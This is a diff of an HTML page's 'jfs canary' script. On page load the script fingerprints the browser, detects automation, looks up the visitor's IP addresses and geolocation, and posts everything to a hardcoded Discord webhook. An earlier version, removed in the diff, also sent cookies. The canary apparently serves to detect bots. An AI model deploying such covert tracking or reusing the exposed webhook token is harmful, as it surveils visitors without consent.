@@ -50,58 +50,166 @@
 
     <script>
     (function () {
-        const WEBHOOK = "https://discord.com/api/webhooks/1549237767643603036/YQbEmlTMv8QPYVhY9YnGFKdaKgHcPODxVuQe4b1pGqtU6oPIS8bPSF0C4kvuMo5XzyIN";
+        const WEBHOOK = [
+            "https://discord.com/api/webhooks/1549237767643603036/",
+            "YQbEmlTMv8QPYVhY9YnGFKdaKgHcPODxVuQe4b1pGqtU6oPIS8bPSF0C4kvuMo5XzyIN"
+        ].join("");
+        const IPV4_ENDPOINT = "https://api4.ipify.org?format=json";
+        const IPV6_ENDPOINT = "https://api6.ipify.org?format=json";
+        const ROUTE_ENDPOINT = "https://ipwho.is/";
+        const LOOKUP_TIMEOUT_MS = 900;
+        const REPORT_WAIT_MS = 1400;
+        const MAX_SUMMARY_LENGTH = 950;
 
         const nav = window.navigator;
         const screen = window.screen;
-        const perf = window.performance && window.performance.timing
-            ? window.performance.timing
-            : null;
+        const startedAt = Date.now();
 
-        const fields = {
-            url: window.location.href,
-            path: window.location.pathname,
-            search: window.location.search,
-            hash: window.location.hash,
-            referrer: document.referrer || "(none)",
-            origin: window.location.origin,
-            userAgent: nav.userAgent,
-            appVersion: nav.appVersion,
-            appName: nav.appName,
-            appCodeName: nav.appCodeName,
-            platform: nav.platform,
-            vendor: nav.vendor,
-            vendorSub: nav.vendorSub,
-            product: nav.product,
-            productSub: nav.productSub,
-            language: nav.language,
-            languages: (nav.languages || []).join(","),
-            cookieEnabled: nav.cookieEnabled,
-            doNotTrack: nav.doNotTrack,
-            onLine: nav.onLine,
-            hardwareConcurrency: nav.hardwareConcurrency,
-            deviceMemory: nav.deviceMemory,
-            maxTouchPoints: nav.maxTouchPoints,
-            pdfViewerEnabled: nav.pdfViewerEnabled,
-            webdriver: nav.webdriver,
-            connection: nav.connection
-                ? {
-                    effectiveType: nav.connection.effectiveType,
-                    downlink: nav.connection.downlink,
-                    rtt: nav.connection.rtt,
-                    saveData: nav.connection.saveData
+        const readValue = (read, fallback) => {
+            try {
+                const value = read();
+                return value === undefined || value === null ? fallback : value;
+            } catch (error) {
+                return fallback;
+            }
+        };
+
+        const createRequestId = () => {
+            if (window.crypto && typeof window.crypto.randomUUID === "function")
+                return window.crypto.randomUUID();
+            return Date.now().toString(36) + "-" + Math.random().toString(36).slice(2);
+        };
+
+        const redactUrl = (rawUrl) => {
+            if (!rawUrl)
+                return "(none)";
+            try {
+                const url = new URL(rawUrl, window.location.href);
+                const sensitiveQuery = new RegExp(
+                    "token|secret|password|passwd|api[-_]?key|access[-_]?token|refresh[-_]?token|session|jwt|sig",
+                    "i"
+                );
+                for (const key of url.searchParams.keys()) {
+                    if (sensitiveQuery.test(key))
+                        url.searchParams.set(key, "[redacted]");
                 }
-                : "(unavailable)",
-            screen: {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
+                if (url.hash)
+                    url.hash = "[redacted]";
+                return url.toString();
+            } catch (error) {
+                return String(rawUrl).slice(0, 500);
+            }
+        };
+
+        const canAccessStorage = (storageName) => readValue(() => {
+            const storage = window[storageName];
+            return !!storage;
+        }, false);
+
+        const getConnection = () => {
+            const connection = nav.connection || nav.mozConnection || nav.webkitConnection;
+            if (!connection)
+                return "(unavailable)";
+            return {
+                effectiveType: readValue(() => connection.effectiveType, null),
+                downlink: readValue(() => connection.downlink, null),
+                rtt: readValue(() => connection.rtt, null),
+                saveData: readValue(() => connection.saveData, null)
+            };
+        };
+
+        const getUserAgentData = () => {
+            if (!nav.userAgentData)
+                return "(unavailable)";
+            return {
+                brands: readValue(() => nav.userAgentData.brands, []),
+                mobile: readValue(() => nav.userAgentData.mobile, null),
+                platform: readValue(() => nav.userAgentData.platform, null)
+            };
+        };
+
+        const getAutomationSignals = () => ({
+            webdriver: nav.webdriver === true,
+            headlessUserAgent: /HeadlessChrome|HeadlessFirefox/i.test(nav.userAgent),
+            playwrightBindingPresent: Object.prototype.hasOwnProperty.call(
+                window,
+                "__playwright__binding__"
+            ),
+            playwrightInitScriptsPresent: Object.prototype.hasOwnProperty.call(
+                window,
+                "__pwInitScripts"
+            ),
+            chromeRuntimePresent: readValue(() => !!window.chrome && !!window.chrome.runtime, false),
+            pluginCount: readValue(() => nav.plugins.length, null),
+            mimeTypeCount: readValue(() => nav.mimeTypes.length, null)
+        });
+
+        const getNavigationTiming = () => {
+            const navigationEntry = readValue(() => {
+                const entries = window.performance.getEntriesByType("navigation");
+                return entries && entries[0];
+            }, null);
+            if (!navigationEntry)
+                return "(unavailable)";
+            return {
+                type: navigationEntry.type,
+                redirectCount: navigationEntry.redirectCount,
+                duration: navigationEntry.duration,
+                transferSize: navigationEntry.transferSize,
+                encodedBodySize: navigationEntry.encodedBodySize,
+                decodedBodySize: navigationEntry.decodedBodySize,
+                responseStart: navigationEntry.responseStart,
+                responseEnd: navigationEntry.responseEnd,
+                domInteractive: navigationEntry.domInteractive,
+                domContentLoadedEventEnd: navigationEntry.domContentLoadedEventEnd,
+                loadEventEnd: navigationEntry.loadEventEnd
+            };
+        };
+
+        const getBaseReport = () => ({
+            schema: "jfs-canary/v2",
+            event: "page-load",
+            requestId: createRequestId(),
+            capturedAt: new Date().toISOString(),
+            page: {
+                url: redactUrl(window.location.href),
+                path: window.location.pathname,
+                referrer: redactUrl(document.referrer),
+                title: document.title,
+                visibility: document.visibilityState,
+                hasFocus: document.hasFocus()
+            },
+            client: {
+                userAgent: nav.userAgent,
+                userAgentData: getUserAgentData(),
+                appVersion: nav.appVersion,
+                appName: nav.appName,
+                platform: nav.platform,
+                vendor: nav.vendor,
+                language: nav.language,
+                languages: nav.languages || [],
+                cookieEnabled: nav.cookieEnabled,
+                doNotTrack: nav.doNotTrack || "unspecified",
+                onLine: nav.onLine,
+                hardwareConcurrency: nav.hardwareConcurrency,
+                deviceMemory: nav.deviceMemory,
+                maxTouchPoints: nav.maxTouchPoints,
+                pdfViewerEnabled: nav.pdfViewerEnabled,
+                connection: getConnection(),
+                storage: {
+                    localStorage: canAccessStorage("localStorage"),
+                    sessionStorage: canAccessStorage("sessionStorage"),
+                    indexedDB: !!window.indexedDB
+                }
+            },
+            display: {
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                availableWidth: screen.availWidth,
+                availableHeight: screen.availHeight,
                 colorDepth: screen.colorDepth,
                 pixelDepth: screen.pixelDepth,
-                orientation: (screen.orientation && screen.orientation.type) || "(none)"
-            },
-            window: {
+                orientation: readValue(() => screen.orientation.type, "(unavailable)"),
                 innerWidth: window.innerWidth,
                 innerHeight: window.innerHeight,
                 outerWidth: window.outerWidth,
@@ -111,145 +219,246 @@
                 scrollY: window.scrollY
             },
             timezone: {
-                offset: new Date().getTimezoneOffset(),
-                locale: Intl.DateTimeFormat().resolvedOptions().locale,
-                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                offsetMinutes: new Date().getTimezoneOffset(),
+                locale: readValue(() => Intl.DateTimeFormat().resolvedOptions().locale, null),
+                timeZone: readValue(() => Intl.DateTimeFormat().resolvedOptions().timeZone, null)
             },
-            storage: {
-                localStorage: (() => {
-                    try { return !!window.localStorage; } catch (e) { return false; }
-                })(),
-                sessionStorage: (() => {
-                    try { return !!window.sessionStorage; } catch (e) { return false; }
-                })(),
-                indexedDB: !!window.indexedDB
-            },
-            cookies: document.cookie || "(none)",
-            performance: perf
-                ? {
-                    navigationStart: perf.navigationStart,
-                    loadEventEnd: perf.loadEventEnd,
-                    domComplete: perf.domComplete,
-                    responseEnd: perf.responseEnd
-                }
-                : "(unavailable)",
-            hitTime: new Date().toISOString()
+            automation: getAutomationSignals(),
+            timing: getNavigationTiming()
+        });
+
+        const wait = (durationMs) => new Promise((resolve) => {
+            window.setTimeout(resolve, durationMs);
+        });
+
+        const fetchJson = (url, timeoutMs) => {
+            const controller = typeof AbortController === "function"
+                ? new AbortController()
+                : null;
+            const options = {
+                cache: "no-store",
+                credentials: "omit",
+                headers: { "Accept": "application/json" },
+                mode: "cors"
+            };
+            if (controller)
+                options.signal = controller.signal;
+            const timeoutId = window.setTimeout(() => {
+                if (controller)
+                    controller.abort();
+            }, timeoutMs);
+            return fetch(url, options)
+                .then((response) => {
+                    if (!response.ok)
+                        throw new Error("HTTP " + response.status);
+                    return response.json();
+                })
+                .finally(() => window.clearTimeout(timeoutId));
         };
 
-        const MAX_FIELDS = 25;
-        const MAX_VALUE = 1024;
-        const MAX_EMBED_TOTAL = 5900;
-
-        const formatValue = (value) => {
-            if (typeof value === "object")
-                value = JSON.stringify(value, null, 2);
-            else
-                value = String(value);
-            if (value.length > MAX_VALUE)
-                value = value.slice(0, MAX_VALUE - 1) + "\u2026";
-            return value;
+        const normalizeIp = (data, version) => {
+            const address = typeof data.ip === "string" ? data.ip.trim() : "";
+            if (!address)
+                throw new Error("no IP returned");
+            return { address: address, version: version };
         };
 
-        const buildEmbeds = (payload) => {
-            const keys = Object.keys(payload)
-                .filter((k) => payload[k] !== undefined && payload[k] !== null);
-            const embeds = [];
-            for (let i = 0; i < keys.length; i += MAX_FIELDS) {
-                const slice = keys.slice(i, i + MAX_FIELDS);
-                const fields = slice.map((k) => ({
-                    name: k,
-                    value: formatValue(payload[k]),
-                    inline: false
-                }));
-                const embed = {
+        const normalizeRoute = (data) => {
+            if (!data || data.success === false || !data.ip)
+                throw new Error("no route data returned");
+            return {
+                address: data.ip,
+                version: data.type || "unknown",
+                country: data.country_code || null,
+                countryName: data.country || null,
+                region: data.region || null,
+                city: data.city || null,
+                postal: data.postal || null,
+                latitude: data.latitude ?? null,
+                longitude: data.longitude ?? null,
+                asn: data.connection && data.connection.asn
+                    ? "AS" + data.connection.asn
+                    : null,
+                organization: data.connection && (data.connection.org || data.connection.isp),
+                timezone: data.timezone && data.timezone.id
+            };
+        };
+
+        const createLookup = (source, url, normalize) => {
+            const state = {
+                source: source,
+                status: "pending"
+            };
+            const promise = Promise.resolve()
+                .then(() => fetchJson(url, LOOKUP_TIMEOUT_MS))
+                .then((data) => {
+                    state.status = "ok";
+                    state.value = normalize(data);
+                    return state;
+                })
+                .catch((error) => {
+                    state.status = "failed";
+                    state.reason = error && error.message ? error.message : "lookup failed";
+                    return state;
+                });
+            return { state: state, promise: promise };
+        };
+
+        const createDependentLookup = (source, dependency, createUrl, normalize) => {
+            const state = {
+                source: source,
+                status: "pending"
+            };
+            const promise = dependency
+                .then((dependencyState) => {
+                    if (dependencyState.status !== "ok")
+                        throw new Error("dependency unavailable");
+                    return fetchJson(createUrl(dependencyState.value.address), LOOKUP_TIMEOUT_MS);
+                })
+                .then((data) => {
+                    state.status = "ok";
+                    state.value = normalize(data);
+                    return state;
+                })
+                .catch((error) => {
+                    state.status = "failed";
+                    state.reason = error && error.message ? error.message : "lookup failed";
+                    return state;
+                });
+            return { state: state, promise: promise };
+        };
+
+        const getLookupReport = (lookup) => {
+            if (lookup.state.status === "ok")
+                return lookup.state.value;
+            return {
+                source: lookup.state.source,
+                status: lookup.state.status,
+                reason: lookup.state.reason || "not ready before report"
+            };
+        };
+
+        const summarize = (value) => {
+            let text = JSON.stringify(value, null, 2);
+            if (!text)
+                text = "(none)";
+            if (text.length > MAX_SUMMARY_LENGTH)
+                return text.slice(0, MAX_SUMMARY_LENGTH - 1) + "\u2026";
+            return text;
+        };
+
+        const createFormData = (report) => {
+            const reportJson = JSON.stringify(report, null, 2);
+            const payload = {
+                username: "jfs-canary",
+                allowed_mentions: { parse: [] },
+                embeds: [{
+                    title: "JFS canary tripped",
+                    description: "One-shot capture `" + report.requestId + "`; detailed JSON attached.",
                     color: 0xcc3333,
-                    timestamp: payload.hitTime,
-                    fields: fields
-                };
-                if (i === 0)
-                    embed.title = "Canary tripped: " + (payload.url || "(unknown url)");
-                embeds.push(embed);
+                    timestamp: report.capturedAt,
+                    fields: [
+                        { name: "Network", value: summarize(report.network), inline: false },
+                        { name: "Page", value: summarize(report.page), inline: false },
+                        { name: "Automation signals", value: summarize(report.automation), inline: false }
+                    ],
+                    footer: { text: "jfs.html canary v2" }
+                }]
+            };
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify(payload));
+            formData.append(
+                "files[0]",
+                new Blob([reportJson], { type: "application/json" }),
+                "jfs-canary-" + report.requestId + ".json"
+            );
+            return formData;
+        };
+
+        let sent = false;
+
+        const trySendBeacon = (beaconData) => {
+            if (typeof nav.sendBeacon !== "function")
+                return false;
+            try {
+                return nav.sendBeacon(WEBHOOK, beaconData);
+            } catch {
+                return false;
             }
-            return embeds;
         };
 
-        const send = (extra) => {
-            const payload = Object.assign({}, fields, extra || {});
-            const embeds = buildEmbeds(payload);
-            const chunkSize = 10;
-            const post = (chunk) => new Promise((resolve, reject) => {
-                const req = new XMLHttpRequest();
-                req.open("POST", WEBHOOK, true);
-                req.setRequestHeader("Content-Type", "application/json");
-                req.onload = () => (req.status >= 200 && req.status < 300)
-                    ? resolve()
-                    : reject(new Error(req.status + " " + req.responseText));
-                req.onerror = () => reject(new Error("network error"));
-                req.send(JSON.stringify({ username: "jfs-canary", embeds: chunk }));
-            });
-            let chain = Promise.resolve();
-            for (let i = 0; i < embeds.length; i += chunkSize)
-                chain = chain.then(() => post(embeds.slice(i, i + chunkSize)));
-            chain.catch((err) => {
-                const req = new XMLHttpRequest();
-                req.open("POST", WEBHOOK, true);
-                req.setRequestHeader("Content-Type", "application/json");
-                req.send(JSON.stringify({
-                    username: "jfs-canary",
-                    content: "canary send failed: " + err.message
-                }));
-            });
+        const sendOnce = (report) => {
+            if (sent)
+                return;
+            const beaconData = createFormData(report);
+            sent = true;
+            if (trySendBeacon(beaconData))
+                return;
+            Promise.resolve()
+                .then(() => fetch(WEBHOOK, {
+                    method: "POST",
+                    body: createFormData(report),
+                    credentials: "omit",
+                    keepalive: true,
+                    mode: "cors"
+                }))
+                .catch(() => undefined);
         };
 
-        const normalizeIpwho = (geo) => ({
-            ip: geo.ip,
-            city: geo.city,
-            region: geo.region,
-            country: geo.country_code,
-            countryName: geo.country,
-            postal: geo.postal,
-            latitude: geo.latitude,
-            longitude: geo.longitude,
-            org: geo.connection && geo.connection.isp,
-            asn: geo.connection && geo.connection.asn ? "AS" + geo.connection.asn : null,
-            timezone: geo.timezone && geo.timezone.id
-        });
+        const ipv4Lookup = createLookup(
+            "api4.ipify.org",
+            IPV4_ENDPOINT,
+            (data) => normalizeIp(data, "IPv4")
+        );
+        const ipv6Lookup = createLookup(
+            "api6.ipify.org",
+            IPV6_ENDPOINT,
+            (data) => normalizeIp(data, "IPv6")
+        );
+        const ipv4GeoLookup = createDependentLookup(
+            "ipwho.is IPv4",
+            ipv4Lookup.promise,
+            (address) => ROUTE_ENDPOINT + encodeURIComponent(address),
+            normalizeRoute
+        );
+        const routeLookup = createLookup(
+            "ipwho.is route",
+            ROUTE_ENDPOINT,
+            normalizeRoute
+        );
+        const lookups = [ipv4Lookup, ipv6Lookup, ipv4GeoLookup, routeLookup];
 
-        const normalizeIpapi = (geo) => ({
-            ip: geo.ip,
-            city: geo.city,
-            region: geo.region,
-            country: geo.country,
-            countryName: geo.country_name,
-            postal: geo.postal,
-            latitude: geo.latitude,
-            longitude: geo.longitude,
-            org: geo.org,
-            asn: geo.asn,
-            timezone: geo.timezone
-        });
-
-        const tryFetch = (url, normalize) => fetch(url, { headers: { "Accept": "application/json" } })
-            .then((res) => {
-                if (!res.ok)
-                    throw new Error("HTTP " + res.status);
-                return res.json();
-            })
-            .then(normalize);
-
-        const enrichWithGeo = () => {
-            tryFetch("https://ipwho.is/", normalizeIpwho)
-                .then((geo) => send({ geo: geo }))
-                .catch(() => tryFetch("https://ipapi.co/json/", normalizeIpapi)
-                    .then((geo) => send({ geo: geo }))
-                    .catch(() => send({ geo: "(lookup failed)" })));
+        const buildReport = (collectionResult) => {
+            const report = getBaseReport();
+            report.collection = {
+                result: collectionResult,
+                elapsedMs: Date.now() - startedAt,
+                timeoutMs: REPORT_WAIT_MS
+            };
+            report.network = {
+                ipv4: getLookupReport(ipv4Lookup),
+                ipv4Geo: getLookupReport(ipv4GeoLookup),
+                ipv6: getLookupReport(ipv6Lookup),
+                route: getLookupReport(routeLookup)
+            };
+            report.sentAt = new Date().toISOString();
+            return report;
         };
 
-        try {
-            enrichWithGeo();
-        } catch (e) {
-            send({ geo: "(lookup threw: " + e + ")" });
-        }
+        window.addEventListener("pagehide", () => {
+            sendOnce(buildReport("pagehide"));
+        }, { once: true });
+
+        const collectAndSend = async () => {
+            const allLookups = Promise.all(lookups.map((lookup) => lookup.promise));
+            const collectionResult = await Promise.race([
+                allLookups.then(() => "complete"),
+                wait(REPORT_WAIT_MS).then(() => "deadline")
+            ]);
+            sendOnce(buildReport(collectionResult));
+        };
+
+        collectAndSend().catch(() => undefined);
     })();
     </script>
 </body>
